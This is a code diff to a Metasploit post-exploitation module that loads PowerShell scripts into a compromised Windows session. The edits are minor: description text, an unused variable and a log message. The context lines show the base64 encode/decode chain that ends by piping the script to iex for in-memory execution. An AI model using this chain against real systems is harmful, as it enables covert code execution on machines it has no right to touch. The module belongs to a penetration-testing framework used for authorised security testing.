@@ -15,9 +15,8 @@ class Metasploit3 < Msf::Post
     super(update_info(info,
       'Name'                 => "Load Scripts Into PowerShell Session",
       'Description'          => %q{
-        This module will download and execute a PowerShell script over a meterpreter session.
-        The user may also enter text substitutions to be made in memory before execution.
-        Setting VERBOSE to true will output both the script prior to execution and the results.
+        This module will download and execute a PowerShell script over a present powershell session.
+        Setting VERBOSE to true will show the stager results.
       },
       'License'              => MSF_LICENSE,
       'Platform'             => ['win'],
@@ -38,7 +37,6 @@ class Metasploit3 < Msf::Post
   def run
     # Get datastore values
     script_in = read_script(datastore['SCRIPT'])
-    folder_in = read_script(datastore['FOLDER'])
 
     # Convert expression to unicode
     unicode_expression = Rex::Text.to_unicode(script_in)
@@ -70,12 +68,13 @@ class Metasploit3 < Msf::Post
       print_good("Compressed size: #{encoded_expression.size}")
       session.shell_command("$script = \"#{encoded_expression}\"")
     end
+
     session.shell_command("$decscript = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($script))")
     session.shell_command("$scriptby  = [System.Text.Encoding]::UTF8.GetBytes(\"$decscript\")")
     session.shell_command("$scriptbybase = [System.Convert]::ToBase64String($scriptby) ")
     session.shell_command("$scriptbybasefull = ([System.Convert]::FromBase64String($scriptbybase))")
     session.shell_command("([System.Text.Encoding]::UTF8.GetString($scriptbybasefull))|iex")
-    print_good("Modules loaded")
+    print_good("Module loaded")
   end
 
 
